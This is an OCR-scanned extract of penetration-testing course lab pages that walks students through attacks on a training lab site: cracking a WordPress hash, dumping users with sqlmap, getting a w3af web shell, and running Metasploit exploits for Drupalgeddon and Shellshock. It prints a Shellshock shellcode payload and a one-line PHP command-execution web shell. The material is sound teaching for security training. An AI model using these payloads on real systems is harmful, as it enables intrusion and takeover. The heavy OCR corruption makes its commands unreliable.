'----' 
'-.J 
'-.J 
'-' 
,.____, 
'-.J 
6 
"---' 
'---" 
'----' 
Crack the Password 
Now, use John the Ripper to crack the hash that was stolen: 
The hash of 3858£ 62230ac3c915f300c664312c63 f was copied to /tmp/hash 
Based upon the length of the hash (32 Hex characters), the format looks to be MOS. 
$ /opt/john/run/john /tmp/hash --format=Raw-MDS 
as 
aw- 
x]) 
OpenMP is disabled; a non-OpenMP build may be faster 
Ctrl-C to abort, almost any other key for status 
2815-11-29 22:35 B.2557 
s 3142c s 
Note: If John the Ripper generates this error: Sorry, SSE2 is required for this build 
• 
This means your host CPU lacks the SSE2 instruction set, which occurs with less than 2% of SEC542 
student laptops. This typically happens with an inexpensive and/or older laptop; one example (of 
older) is a 2010 MacBook Air. The SSE2 instruction set debuted in 2001 and is the successor to the 
older MMX instruction set. 
• 
Unfortunately, there is no workaround (for john): John the Ripper (JtR) community-enhanced 
requires SSE2, and the mainline JtR does not support cracking raw MOS hashes. 
• 
In this case: If you have Internet access, simply run a Google search of the hash. Many online 
rainbow tables have cracked it. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.4: WPScan 
7 
Log In with Cracked Creds 
Now, log in with the compromised credentials. 
Navigate to: 
http://www.sec542.org/wordpress/wp-login.php 
Authenticate with the cracked credentials: 
• 
Username: admin 
• 
Password: foobar 
Feel free to deface the blog with your own rendition of Vogon poetry. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.4: WPScan 
'--' 
'-" 
'-" 
'-.../ 
'-.../ 
'-' 
'--' 
'-' 
'-' 
'-' 
'-' 
'--" 
'-.../ 
'-' 
'-' 
'-' 
'-' 
-...__,/ 
'-' 
'-' 
'-' 
,.___, 
,.___, 
·-....., 
'-' 
'-' 
'-.../ 
'-.../ 
,.___, 
'-' 
'-' 
'-" 
'-' 
'-' 
'-.../ 
,.___, 
'-.../ 
'-' 
'-' 
8 
'-' 
,.___, 
'-' 
Cookie Review 
Having authenticated, review the cookies. In Firefox, click the menu bar and select Cookies Manager+. Find 
the cookie names beginning with wordpressuser and wordpresspass. 
" 
Here's wordpressuser: 
Note: The hash after "wordpressuser "is the hash from this line of the 3960.php output: 
"' 
cookie suffix: c824d0d8c538ab2ba06a35095c8dd02d 
The cookie suffix is derived from the location of word press that set the cookie. 
,~s,cbbb=,CC,m~,-,,. 
[-]$ echo -n www.sec542.org/wordpress 
mdSsum 
c84e2a0dbe3efe83c81cfd19892f58de 
[-U I 
Here's wordpresspass, which also uses the previously identified cookie suffix: 
The "Content" value is the mdSsum of the MOS password hash we cracked: 
$ cat /tmp/hash L mdSsum 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.4: WPScan 
9 
01 
pEUUO:) ~!J3 pue JeUeSIIAI Lnes 8 ~OG@ - GP'9:)3S 
'M04 ~LI!Mo4s uouoas e suieiuoo 
xipuadde qe] snuoq s·z175 a41 ii [ssed a4:i. >peJJ i.uprnoo aM J! ua/\a 'sap100J ssoui punq pjnoo aM a>i!I s>1001 
sqlmap Shortcut 
Recall our previous exercise with sqlmap. That lab provides another means of achieving data exfiltration. In 
that exercise, the DB server that we compromised also houses the database for the Wordpress instance 
for this exercise. This means we can access the data even more easily than we did with WPScan. 
For an easier sqlmap command line, the following parameters use a simpler target than the sqlmap lab 
(mainly because this flaw is an unauthenticated one): 
$ sql:m.ap -u 11http://sec542.org/sqli.php?name=Dent11 
-D wordpress -T 
wp _ users - -dumpt.'""'-where 11id=l 
11 
- -ba.tch 
atabase: wordpress 
Table: wp_users 
[1 entry] 
+----+----------+----------------------------------+------------ 
1 
ID I user_url I user_pass 
I user_login I 
+----+----------+----- -------- -------- --------- +----- 
----- 
1 
1 
I 
http:// 
Bf62230ac3c915f300c664312c63 
+----+----------+---------------------------------- ------------ 
Note: In the preceding screenshot sqlmap's password cracking was quit almost immediately. In this case, 
sq I map too would have been able to make fairly short work of this password hash. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.4: WPScan 
11 
"' 
" 
/"'\ 
ZT 
r--.. 
r--.. 
r--.. 
r--.. 
" 
~ 
" 
" 
~ 
" 
" 
r--.. 
" 
"' 
"' 
r--.. 
r--- 
r--.. 
r--. 
r--. 
r--. 
"' 
~ 
~ 
"' 
r--.. 
r--. 
r--. 
r--. 
r--. 
"' 
r--.. 
r--. 
r--. 
r--. 
" 
r"\ 
,---,. 
,,.....,_ 
peJuoJ ::l!J3 pue Jeuas!~ 4l8S 8 ~OG @ - GVSJ3S 
~ 
I Objectives 
• 
• 
Explore some key features available in the Web Application Attack and Audit (w3af) Framework 
Exploit a flaw from within w3af 
!challenge: Steps 
Target: http://www. sec542. org/scanners/ 
Perform the following tasks in w3af: 
• 
Launch the GUI 
• 
Configure the Scan to use the Sec542 profile 
• 
Launch the Scan 
• 
Examine the Results 
• 
Exploit command injection flaw to achieve a web shell 
• 
Use the shell to verify the uid of the compromised account 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.5: w3af 
1 
lstep-by-Step lnstrUctions 
Configure and Start the Scan 
Open a terminal and type these commands: 
Choose Profile: Sec542 
Press Start 
bruteferce 
tastscan 
full_am.m 
I>" 
fu!l-aud!Uplcler _man
1 P- 
stternap 
web jntrastrncture 
crawl 
evasion 
grep 
Infrastructure 
mangle 
The Sec542 profile will scan: http://www. sec542. org/ scanners/ 
Note that we chose the URL "http://www. sec542. org/ scanners/" because it will quickly allow 
os_commanding (a powerful w3af feature). Scanning the entire site will also work, but may take a long 
time before allowing os_commanding. 
Feel free to try other options once you have completed the steps of this lab. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.5: w3af 
'---' 
\....I 
'-J 
'-J 
.._, 
.._, 
..._,,, 
'-J 
'-' 
.._, 
..._,,, 
'-...,,' 
'-J 
'-' 
'-...,, 
'-...,, 
'---' 
'-'' 
'-' 
'-' 
'-../ 
'-J 
.._, 
'--' 
'-J 
'-' 
'-' 
'-' 
'-' 
'-J 
'-...,, 
'-../ 
'-' 
'-J 
'-' 
'-' 
'--' 
'--' 
2 
'--' 
.._, 
'-...,, 
w3af Running Results 
w3af should complete the scan of http://www. sec542. org/ scanners fairly quickly. 
The "broom" icon will appear in place of the start button. 
audit_high_risk 
bruteforce 
fast_scan 
fuU_audit 
full_audit_spider_man 
sitemap 
web _infrastructure 
fl. '.J 
bruteforce 
• 
crawl 
I> t: evaskm 
1> ii 
grep 
II> LJ 
infrastrui::ture 
t 11> -J 
mangle 
We have tested this lab extensively, and the scan should complete quickly. However, w3af is a bit buggy (in 
our experience, quite buggy for such a popular web application penetration testing tool), so your results 
may vary. 
If the scan does not exit quickly, you may check results as w3af runs (note that the responsiveness may be 
a bit slow). 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.5: w3af 
3 
w3af Results -> URLs 
'---' 
'--' 
The Results-> URLs tab is useful. It shows a tree of http: //www.sec542.org/scanners/ 
u~. --- 
a 
) 
., http://www.sec542.org 
i.........J\111. J 
http://www.sec542.org 
Note: We limited the scan to /scanners/ so that the scan would complete quickly. Once you have 
completed the lab steps, feel free to scan a larger portion of the website (such as 
http://www.sec542.org/). 
Please note: A larger scan will take a lot more time, and consume a lot of RAM and CPU from your VM. 
w3af may become unresponsive during a large scan. 
\._,I 
'-.../ 
'-.../ 
'-.../ 
'-.../ 
'-.../ 
'-' 
'-J 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-.../ 
'--' 
'-' 
'-J 
'-J 
'--' 
'--' 
'--' 
'-' 
'-' 
'-' 
'-../ 
'-.../ 
'-.../ 
'-' 
'-' 
'--' 
'--' 
'-.../ 
'--' 
'--' 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.5: w3af 
4 
'-./ 
'-.../ 
'--./ 
w3af Results -> KB Browser 
Go to Results -> KB Browser: 
• 
Inspect the findings. 
• 
Be sure to check all critical (red) findings. 
o5 ... commandi11g 
v 
os_c-omm..ir.:ding 
bl.'lnkJ:iooy 
,qk 
{1) 
f 1) 
GET http: I /ww. t•:cc542 .or g/sct,1i;,ers/c1>llllil.nd,n.1. ph;)i'co,,-,Tian~2fcin'l:2Frat%2iJ%2Fet,% 
2Fpa,iwd HTIP/1.1 
C•Uent • \en9th: 1:l 
Accept-McOlli~: gzip, deHate 
Accept; *!' 
\Iser-agent, ws;if, org 
Host: ,td'«. sec542. o 11) 
Rderer: http://>MI, sec!\·12. orqJ 
Content-type: cppUcation/x·,tdw·fOrn>11rlenro<led 
The screenshot above shows an os_commanding flaw. 
Here is a SQL injection result: 
GET http:/ /W'fiW. sec542. o rg/scanne rs/ sq li. php ?name=a%27b~.;22C-.27d%22 
Content-\ength: 8 
Accept-encoding: gzip, deflate 
Accept: */* 
User-agent: w3ef.org 
Host: w.-1w. sec542.org 
Refe rer: http: I /\o.W. s:ec542. org/ 
content-type: application/x-www-form-urlencoded 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.5: w3af 
5 
w3af os_commanding: Let's Get a Shell! 
• 
Go to the "Exploit" tab 
• 
Right-click os_commanding 
• 
Choose "Exploit all until first successful" 
+ 
l!: 
This plt1g1n. expiolts os commandlng:\/Ulneraf 
remote shell, 
Add ... 
• 
Click OK on the results pop-up 
• 
Double-click the shell 
dav 
evat 
Blank http response body 
f!le_upload 
& Path disclosure vulnerablllty 
Blank http response body 
rfl 
sqlmap 
xpath 
1\6. Click-Jading vulnerablltty 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.5: w3af 
-....., 
'-./ 
'-./ 
'-_.I 
'-' 
'-' 
'-' 
'-' 
'-.J 
'-..,,· 
'-' 
'-' 
'-" 
'-' 
'-' 
'-" 
'-' 
'-' 
'-' 
'-" 
'-" 
'-' 
'-' 
'-' 
'-" 
'-.J 
'-' 
'-' 
'-' 
'-' 
'-' 
'-" 
'-.J 
'-' 
'-' 
'-' 
'-' 
'-" 
'-' 
'-' 
6 
\...., • 
\....-· 
'-...,- 
w3af Use the Shell 
We can now try out various commands using the shell we have gotten. Try running uname - a, id, pwd, 
who, and so on. 
Note: This shell differs from the ones that we have used thus far in class. Rather than simply typing desired 
commands, you will need to prepend the command with execute (which may be shortened as exec, or 
simply e) 
www-data@security542> e id 
www-data@security542> e uname -a 
www-?'g.ata@Eiecurit:y-542 
e uname -a 
;.,inux 
2 
.3~13,.0- 
GNU/Linux 
Note: There is a small output bug that requires you to press Enter after every command to return to the 
prompt. This bug is purely cosmetic: The command will run fine without the extra <enter>. 
Keep in mind that the commands we run cannot be interactive commands (such as "less" or "Firefox") as 
the exploit sends the command to the vulnerable application that runs it. The results are then parsed from 
the application response. 
The help command (no e required) will show available shell commands: 
www-data@security542> help 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.5: w3af 
7 
~ - 
-- -- 
- 
-=-- 
~ 
":'.. 
~ 
- 
= 
-~ 
- ~ 
=- 
- 
- 
~ --- - -- 
_ -- -)~2i~-Exen~jse 5. o~=;::- _ Meta~plqit ;;-.-~. · 
- -=~... 
- 
- 
~ 
..:: -...::;:::::. "'-- _- 
~x 
~- -- 
- 
- 
- 
- - 
~ 
- 
- 
~ 
- 
~ 
I Objectives 
• 
Gain hands-on experience with Metasploit Framework for application testing 
• 
Learn to navigate msfconsole 
• 
Use Meatsploit to exploit the Drupalgeddon vulnerability 
• 
Work with the PHP Meterpreter payload 
• 
Increase capability of our previous Shellshock exploitation through use of Metasploit 
!Lab Setup 
Open a terminal, configure a static IP address, and restart Apache to maximize stability during 
exploitation. You should already have a static IP, but resetting it verifies that it's correct: 
[ $ x.~udo config-static.sh 
_J 
sudo service apache2 restart 
Then, run the Metasploit console: 
$ cd /opt/metasploit-framework 
./msfconsole 
[,H 
.·• 
>> 
·. 
=c( __ (o{ 
J) 
),:::\ 
. 
II\\ 
II 
\\ 
II 
\\ 
II R,E(U, \\ 
II 
\\ 
,, 
J 
IAAAAAA~AA~AA~All 
__ 
I 
"::-AYLOAD 
I 
.,,i 
i 
l..,..._-----,----,,...,.1 _ P _ I 
1(@)(@)·····11@)(@)••1(@) 
j o n sr u n 
t1 
n 
i==[**:j 
l 
\ 
I__ 
\······ ···- 
!=!w:t 
]- 
.. --:"'-\ 
1 
~\ 
\ (@) (@) {@) (@) (@) (@) (@) / 
I 
I 
I 
\ 
\ 
I 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.6: Metasploit 
1 
l~hollenge: Three Levels of Difficulty 
\._,I 
'-..,I 
1. 
Perform the following steps with msfconsole: 
• 
Exploit Drupal on http:/ /drupal with a php/meterpreter/reverse_tcp payload. 
• 
Exploit Shellshock on http:// shell shock. sec542. org/ cgi-bin/netstat. cgi with a 
linux/x86/shell reverse tcp payload, proxied via Burp. 
2. 
Follow the step-by-step instructions to exploit Dru pal, and then leverage what you have learned to 
exploit Shellshock with no hints. 
3. 
Follow all step-by-step instructions to exploit both. 
\._,I 
'-../ 
'-.../ 
'--' 
'--' 
'-._/ 
'--' 
'-" 
Step-by-step instructions begin on the next page. 
'-../ 
'-" 
Choose your own difficulty! 
'-" 
'--' 
'-" 
'-.../ 
'-../ 
'-" 
'-.../ 
'--' 
'-.../ 
'-.../ 
'-.../ 
'-.../ 
'--' 
'-.../ 
'--' 
'-" 
'-" 
\._..I 
'-.../ 
'--' 
\._..I 
'--' 
'-..,I 
'-.../ 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.6: Metasploit 
2 
'--' 
'-" 
'-' 
!Step-by-Step Instructions 
Metasploit/Drupalgeddon Step-by-Step 
Type the following commands in msfconsole: 
msf> use 
msf> set 
msf> set 
f> 
exploit/multi/http/drupal_drupageddon 
RHOST drupal 
PAYLOAD php/meterp 
LHOST 127c".O.O .1 
msf> ~xploit 
Sometimes, Apache becomes unstable after attempted and repeated pwnage. In that case, open a 
terminal and type: 
I $ sudo service apache2 reload 
• •. ~-,.,.,,);.~;. 
"<'. « 
~-_,_,,,.,; 
M./4#¥kZ"'"" 
5. 
.c.>-~SU/4.!# .. ~-- 
i¼e=&%.1%,«¼ZZ2.&,-,..,,,.,_,w,,_4 
r-,, 
Then, retry the exploit. 
r"'\ 
Type PHP Meterpreter Commands 
Type the following commands at the meterpreter> prompt: 
meterpreter > getuid 
sy~info 
Then, background the session by pressing CTRL-Z 
Jmeterpreter > 
!Background session l? [y/N] 
imsf exploit ( 
lsess.ion :::> l. 
} > setq session 1 
If you have used Windows Meterpreter, PHP Meterpreter has far less functionality as of now. It is also 
much newer and under active development. You must use the same session ID from your Meterpreter 
session. It will be 1 unless you have made multiple attempts. 
msf> setg session <Session id> 
msf> use post/linux/gather/enum_configs 
msf> run 
r"'\ 
Try others: 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.6: Metasploit 
3 
msf> use post/linux/gather/enum_network 
msf> run 
'--' 
'--' 
'--' 
All looted files will be saved to /home/student/ .msf4/loot/. 
'--' 
'--' 
'--' 
'---' 
'-....., 
'--' 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'--' 
'--' 
'--' 
'--' 
'---' 
'---' 
'---' 
'--' 
'---' 
'---' 
'--' 
'---' 
'---' 
'--' 
'--' 
'--' 
'--' 
'--' 
'--' 
'---' 
'--' 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.6: Metasploit 
4 
'---' 
'----' 
'._/ 
Next Up: Shellshock 
Exploit Shellshock with a linux/x86/shell reverse tcp payload. 
For extra credit, proxy the exploit via Burp to see the blow-by-blow details on 
the Shellshock exploit. 
To proxy via msfconsole: 
Burp can break forward (bind) meterpreter sessions or make them unreliable. Use a 
php/meterpreter/reverse_tcp payload. You also must set ReverseAllowProxy to "true." 
Start Burp and set these msfconsole options before typing exploit: 
msf> set Proxies HTTP:127.0.0.1:8082 
> set ReverseAl.l9wProxy true 
You may stop now and attempt this challenge, or step-by-step instructions begin on the next page. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.6: Metasploit 
5 
Metasploit/Shellshock Step-by-Step 
,.__,, 
Burp is not required for this exercise, but it enables us to understand how Metasploit exploits Shellshock. 
Please use the RHOST as described. Both Metasploit and Burp have bugs associated with using localhost; 
shellshock.sec542.org resolves to 192.168.1.8 and works fine with both Metasploit and Burp. 
Start Burp and type the following in the msfconsole session: 
msf> use exploit/multi/http/apache_mod_cgi_bash_env_exec 
msf> set RHOST shellshock.sec542.org 
msf> set TARGETURI /cgi-bin/netstat.cgi 
msf> set TARGET 1 
msf> set PAYLOAD linuJC/x86/shell_reverse_tcp 
msf > set LHOST 127. 0. 0 
.. 1 
msf> set LPORT 4242 
msf> set :Proxies HTTP:127.0.0.1:8082 
msf> set ReverseAllowProxy true 
msf> expl..<:>it 
Waitafewsecondsafterthisappears: [*] 
Command shell session 1 opened 
There will be no prompt; just type shell commands: 
[~~Mi _, - 
->c>:ez:::::::::::: ----<~ 
,~,k2.~~~~im twm_,L,5&&i 
,,,,...,A.W!Jll!&l&iliZL="-'JS 
-,½£31i1!£j 
<- W= &&&MM 
:'"e!t!!l!ll"Jr,..,iU·;F·-•·-··....-- 
Note that setting TARGET to 1 chooses Linux x86 as the target platform. Automatic targeting (target 0) 
sometimes fails for the cross-platform (multi) exploits. 
If you see this error, Burp is not running and listening on port 8082: [-] Exploit failed 
[unreachable] : 
Rex: : ConnectionRefused. The connection was refused ... 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.6: Metasploit 
'--"' 
'--"' 
'-' 
'--"' 
'-..,,' 
'-' 
"-/ 
'--"' 
'--"' 
'--"' 
'--"' 
'--"' 
'--"' 
'-" 
"-/ 
'--"' 
,.__,, 
'-' 
'-' 
'--"' 
.'-' 
'-' 
'-' 
"-"'' 
.._, 
'-' 
'-' 
,.__,, 
'-' 
'--'' 
"-/ 
'-' 
'-" 
'-" 
..___, 
'--"' 
6 
'-' 
'-J 
'--" 
View the Exploit in Burp 
Understand how Metasploit works its magic: View the exploit in Burp. 
Go to Site map -> shellshock.sec542.org -> cgi-bin -> netstat.cgi 
ca /co1-brn/netstat.c9i HTTP/1.1 
Host: shellshock.sec542.org 
User-Agent: 0 { :;} ;edm -e 
• V\nSlfk2dh8qsUXYp6Ka2XEiQd7vSN$(echo -en 
\ \x7f\ \X45\ \it4C\ \x46\ \xOl \\x01\ \xGl \ \XOO\ \.XOO\ \x00\ \XOO\ \X00\ 
\X00\\x00\\x00\\x00\\x02\\X00\\X03\\x00\\X01\\x00\\x00\\X00\\ 
x54\\x80\\X04\\x08\\x34\\X00\\x00\\x00\\X00\\x00\\X00\\X00\\x 
00\\x00\\X00\\x00\\x34\\x00\\x20\\x00\\x01\\x00\\x00\\x00\\x0 
0\\x00\\x00\\x00\\XOl\\x00\\x00\\x00\\x00\\x00\\X00\\x00\\r00 
\\x80\\x04\\x08\\x00\\x80\\x04\\x.08\\JSl8\\x00\\x.00\\X00\\xdc\ 
\X00\\x00\\X00\\x07\\X00\\X00\\X00\\x00\\Xl0\\X00\\x00\\X31\\ 
xdb\\xf7\\Xe3\\x53\\x43\\x53\\x6a\\X02\\x89\\xl!l\\xb0\\x66\V 
cd\\x80\\x93\\x59\\xb0\\x3f\\xcd\\x88\\x49\\x79\\xf9\\x68\\x7 
f \ \XOO\ \X00\ \xOl \ \X68\ \X02\ \XOO\ \XlO\ \X92\\X89\ \X8l \ \xbO\ \x66 
\ \JSO\ \x51 \ \x53\ \xb3\ \X03\ \xSSI\ \xel \\xcd\ \xBG\ \x52\ \x68\ \x2f \ 
\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\Xl!'3\\x52\\x53\\ 
x0!il\\xel\\xb0\\x.ttl\\xcd\\xOO;:,,>/tmp/gBJYR; /bin/chraod 777 
/tmp/gBJYR ; /t~/g8JYR)9fk2dh8qsUXYpl5Ka2XEiQd7v5N" 
Content-Type: applicationtJ1·"""-for111-urlencoded 
Content-Length: 0 
" 
Here is a close-up of the exploit: 
User-Agent: 
() 
{ 
: ; } ; echo -e "\r\n9fk2dh8qsUXYp6Ka2XEiQd7v5N$ ( echo -en 
\\x7f\\x45\\x4c\\x46\\x01\\x01\\x01\\xOO\\xOO\\xOO\\xOO\\xOO\\xOO\\xOO\\xOO\ 
\xOO\\x02\\xOO\\x03\\xOO\\x01\\xOO\\xOO\\xOO\\x54\\x80\\x04\\x08\\x34\\xOO\\ 
xOO\\xOO\\xOO\\xOO\\xOO\\xOO\\xOO\\xOO\\xOO\\xOO\\x34\\xOO\\x20\\xOO\\x01\\x 
00\\xOO\\xOO\\xOO\\xOO\\xOO\\xOO\\xOl\\xOO\\xOO\\xOO\\xOO\\xOO\\xOO\\xOO\\xO 
O\\x80\\x04\\x08\\xOO\\x80\\x04\\x08\\x98\\xOO\\xOO\\xOO\\xdc\\xOO\\xOO\\xOO 
\\x07\\xOO\\xOO\\xOO\\xOO\\xlO\\xOO\\xOO\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\ 
\x6a\\x02\\x89\\xel\\xbO\\x66\\xcd\\x80\\x93\\x59\\xbO\\x3f\\xcd\\x80\\x49\\ 
x79\\xf9\\x68\\x7f\\xOO\\xOO\\x01\\x68\\x02\\xOO\\xlO\\x92\\x89\\xel\\xbO\\x 
66\\x50\\x51\\x53\\xb3\\x03\\x89\\xel\\xcd\\x80\\x52\\x68\\x2f\\x2f\\x73\\x6 
8\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\\x89\\xel\\xb0\\x0b\\xcd\\x80 
>>/tmp/gBJYR; /bin/chmod 777 /tmp/gBJYR 
/tmp/gBJYR)9fk2dh8qsUXYp6Ka2XEiQd7v5N" 
We break this syntax down on the next page. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.6: Metasploit 
7 
What Is Metasploit Doing? 
'--' 
'--' 
Here is a simplified version: 
'--' 
echo -e "\r\nrandom1$(echo -en <shellcode> >>/tmp/random2 ; 
/bin/chmod 777 /tmp/random2 ; /tmp/random2}randoml" 
• 
Echo a return, newline, and a random string (randoml) 
• 
Save the hex-encoded shellcode as binary shellcode to /tmp/random-name (random2) 
• 
Make the binary shellcode executable 
• 
Run it 
• 
Echo the random string again 
Type this far simpler terminal command to see this format/syntax in action: 
'-..../ 
'--' 
'--' 
'-..../ 
'--' 
'-' 
'-..../ 
'--' 
'--' 
[ $ echo -e .l'\:i;\n###$ (pwd} #it#" 
. 
. 
~ 
-ytz:JM!JttttM& J 
<MW 
¾tZUZS£JfLtT., 
mttw:& 
&% 
Mi£Mi;&;tiit:tJii.zwc.d, .. 
'--' 
'-' 
'--' 
A few additional notes: 
'--' 
• 
Echo-ing "\r\n", as well as randoml before and after the exploit, ensures that there will be a blank line, 
followed by some output. This ensures there will be output coming from the cgi-bin script that will be 
sent to the "browser." 
• 
Omitting the newline and some output will fail with this Apache error: 
[Tue Jan 06 10:02:55.763676 2015] 
[cgi:error] 
[pid 21441] 
[client 127.0.0.1:40908] Premature end of script headers: 
netstat.cgi 
• 
$ ( command) is the POSIX-compliant version of 'command' (using backticks). Backticks are not 
single or double quotes. The backtick character is below the <Esc> key on a US keyboard layout. 
'--' 
'--' 
'--' 
'--' 
'-..../ 
'--' 
'--' 
'--' 
'-' 
'--' 
'--' 
• 
These two commands are equivalent: 
'--' 
'-' 
$ echo -e 11\r\n###$(pwd}###11 
$ echo -e 11\r\n###'pwd'###" 
'--' 
'-' 
'--' 
'-' 
'--' 
'--' 
'-' 
'-' 
'--' 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.6: Metasploit 
8 
'--' 
'--' 
'--' 
"' 
I Objectives 
• 
Realize many off-the-shelf exploits often initially fail 
• 
Work through failed exploitation to arrive at a working exploit 
• 
Manually exploit vulnerable applications starting from failed PoC 
• 
Configure Metasploit to make previously failed exploit successful 
"' 
!Lab Note 
As discovered previously: 
• 
cust42.sec542.com has a vulnerable version of MediaWiki installed. 
• 
Metasploit has a matching exploit (which will fail). 
• 
We will then manually craft an exploit to upload a PHP shell to the vulnerable MediaWiki server. 
• 
We will then use what we have learned to properly configure Metasploit. 
jLab Setup 
1. Open Firefox and surf to http://cust42.sec542.com/mwiki 
Note: We discovered this virtual host in the ZAP forced browse exercise 
2. 
Press CTRL-U to view the source code. Note the Media Wiki version (line 6): 
<meta name=11generator11 
content=11MediaWiki 1.21.411 /> 
lrtty.ll<:U,!i42.setS42.c(lm/mwikifioi:f~plip/Mai!U''age ~ Mo.ilia Firefox 
-------·----·· 
- + X 
view-source:http:JJcust42set542.com/mwikillndex.php/MainJ'agec 
E 
«! DOCTYP£ 
l,u
. 
<html. tang .. •en• dfo,,•ur• class,.~dient-noj s "> 
<head> 
<title>Expedition 42</title> 
<m!l'ta cha rset•"l.!TF · 8* /> 
"l'ieta ni!IH=•generator• content,."MediaWiki 1.21.4• /> 
<link retw• alternate.· type-=•app lit at ion/x-wiki. tit'lem" Edit. bref=· ~ii index I php?ti t le,Main Page&amo; s&ti~i t 
ff /> 
<Unk ret. .. •edit• titte:•£dit• href•" /mwiki/index. oho?title:~in ?ag~'\,amp; action=eait• /> 
<link ret .. =shcrtcut icon• href,.•1fav.icon.ico" /> 
,. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.7: When Tools Fail 
1 
'--' 
!step-by-Step Instructions 
\._./ 
\._./ 
Metasploit 
'-.J 
Type the following commands: 
'----" 
'-' 
$ cd /opt/metasploit-fram.ework 
./msfconsole 
Note that there is one MediaWiki exploit; let's try it: 
use exploit/multi/http/mediawiki 
Description: 
MediaWiki 1.22.x before 1.22.2, 1.21.x before 1.21.5 and 1.19.x 
before 1.19.11, when DjVu or PDF file upload support is enabled, 
allows re111ote unauthenticated users to execute arbitrary com111ands 
via shell metacharacters. If rm target file is specified this •odule 
will attempt to log in with the provided credentials to upload a 
file {.DjVu) to use for exploitation. 
The Metasploit exploit info states "MediaWiki 1.22.x before 1.22.2, 1.21.x before 1.21.5 and 1.19.x before 
1.19.11, when DjVu or PDF file upload support is enabled, allows remote unauthenticated users to execute 
arbitrary commands via shell metacharacters .... " 
We know that the installed version of MediaWiki is 1.21.4, which is vulnerable. We also happen to have an 
account with upload privileges: marvin/paranoid (used in the previous client authentication exercise). 
Type the following commands in msfconsole: 
msf 
RHOST cust42.sec542.com 
USERNAME 
PASSWORD 
Metasploit should respond: 
[*] cust42.sec542.com:80 - The target appears to be vulnerable. 
If it does not respond as shown above, recheck the commands you typed above. 
'-' 
'-' 
'-' 
'-.J 
'----" 
'----" 
'----" 
'----" 
'----" 
'-' 
'-' 
'-.J 
'-' 
'----" 
'-' 
'--" 
'-' 
'----" 
'-" 
'----" 
'--" 
'----" 
'----" 
'-.J 
'-.J 
'----" 
'-" 
'-.J 
'-.J 
'----" 
'-' 
'--" 
'-' 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.7: When Tools Fail 
2 
'----" 
'-' 
'-' 
Unhappy pwning!! 
Type the following msfconsole command: 
I mstt ex~loit 
=sG%lm&.-tmb&L&.J 
_ 
_ 
__ ~~ 
;a:.:::utm::::.: .JiL, 
terminal 
exptoit(m:ediawiki_thumb) 
Started reverse handler on 192.168.1.8:4444 
Grabbing version and login CSRF token 
.... 
Retrieved login CSRF token. 
Attempting to login ... 
Log in successful. 
Getting up load CSRF token ... 
Retrieved upload CSRF token. 
Uploading OjVu file nUdP.djvu .•. 
file uploaded to http://cust42.sec542.com/mwiki/index.php/File:NUdP.djvu 
Sending payload request 
...• 
Received response see, exploit probably failed. 
Exploit completed, but no session was created. 
exploit(mediawiki_thumb) > I 
The exploit fails, though it should have worked. This happens from time to time, and this is where a 
penetration tester can demonstrate the difference between an amateur and a professional. Persistence in 
the face of adversity is a key quality of a successful penetration tester. 
We will later identify why it failed, change the options, and exploit MediaWiki successfully. Leave the 
msfconsole terminal open: You will change a configuration option and attempt exploitation again later in 
this exercise. 
Here is the error returned to Metasploit (seen when we proxied the exploit via Burp to troubleshoot), 
which appears different from the error we will see when we manually exploit the server. Note that you do 
not need to proxy the Metasploit exploit yourself; this is for illustration purposes: 
HTTP/l.1 500 Internal server error 
Date: Fri, 19 Jan 2018 01:15:21 GMT 
Server: Apache/2.4.7 (Ubuntu) 
X-Powered-By: PHP/5.5.9-lubuntu4 
.. .20 
X-Content-Type-Options: nosniff 
Cache-Control: no-cache 
content· Lenqth: 180 
Connection: close 
Conte11t-Type: text/html; 
-8 
<html><head><title>Error generating thumbnail</title></head> 
<body> 
<hl>Error generating thumbnail</hl> 
<p> 
The specified thumbnail parameters are not valid. 
</p> 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.7: When Tools Fail 
3 
What Happened? 
'---' 
\._,I 
Metasploit's default FILENAME option isn't working on this MediaWiki server: 
• 
It uploads metasploit.djvu and generates a thumbnail 
• 
Exploit failure is probably due to a server configuration issue 
'-..,I 
'-' 
'-' 
'-' 
Let's verify the server is vulnerable and manually exploit the vulnerability: 
'---' 
We'll upload this PHP shell: 
'---' 
'-.../ 
<?php 1:1ystem(\\$_GET[1cmd1]); ?> 
'-.../ 
'---' 
Note: It's a bit different than the PHP shell shown in the PoC code discussed previously. We changed the 
variable named from "1" to "cmd" for the sake of clarity. 
We need to double-escape to dollar sign("$") to ensure it passes through cleanly and is written to the PHP 
script as a literal dollar sign. 
Once saved in an accessible area of the website, this PHP shell will use the system function to execute any 
command passed via the "crud" variable, for example, this URI will execute the "id" command: 
example.php?cmd=id 
Next step: Log in to the site and begin the manual exploitation process. 
'-' 
'---' 
'---' 
'-' 
'---' 
'-' 
'-' 
'-' 
'---' 
'---' 
'-' 
'-' 
'---' 
'-' 
'-' 
'-' 
'-../ 
'-../ 
